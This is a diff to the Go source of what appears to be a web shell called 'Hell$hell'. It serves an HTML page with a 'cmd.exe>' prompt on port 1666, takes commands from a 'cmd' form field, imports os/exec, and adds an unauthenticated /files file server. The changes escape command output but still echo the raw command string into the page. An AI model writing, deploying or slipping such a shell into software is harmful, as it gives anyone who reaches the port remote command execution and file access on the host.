@@ -12,8 +12,9 @@ Usage
 package main
 
 import (
-	"fmt"
 	"io"
+	"fmt"
+	"html"
 	"net/http"
 	"os/exec"
 	//"github.com/andrewingor/hellShell/go"
@@ -30,7 +31,7 @@ func init() {
 	//
 }
 
-// Conclusion of Contract
+// Conclusion The Contract 
 func conclusion(
 	resp http.ResponseWriter,
 	req *http.Request) {
@@ -42,20 +43,19 @@ func conclusion(
 		fmt.Println(err)
 		io.WriteString(resp, err.Error())
 	}
-	io.WriteString(resp, string(echo))
+	io.WriteString(resp, html.EscapeString(string(echo)) ) 
 
-	io.WriteString(resp, "<hr>"+req.FormValue("cmd"))
+	io.WriteString(resp, "</pre><hr>"+req.FormValue("cmd"))
 	io.WriteString(resp, "</body></html>")
 }
 
-//Hell Shell Run and Contracts conclusion
+//Hell Shell Run
 func main() {
-	workdir := "."
-
 	http.HandleFunc("/", conclusion)
+	http.Handle("/files", http.FileServer(http.Dir("./files") ) )
+	
 	http.ListenAndServe(":1666", nil)
 
-	http.FileServer(http.Dir(workdir))
 }
 
 //Web-muzzle
@@ -65,6 +65,9 @@ var webmuzzle string = `
 <html>
 <head><title>Hell$hell</title></head>
 <style>
+pre {
+	font-family: Consolas, Courier New
+}
 body {
 	text-align: left;
 	margin-left: 10%;
@@ -95,6 +98,6 @@ cmd.exe&gt;<input class="cmd" type="text" name="cmd" value="" autofocus />
 </div>
 <script type="text/javascript">document.cmdstr.cmd.focus();</script>
 <hr/>
+<pre>
 `
-
 //EOF
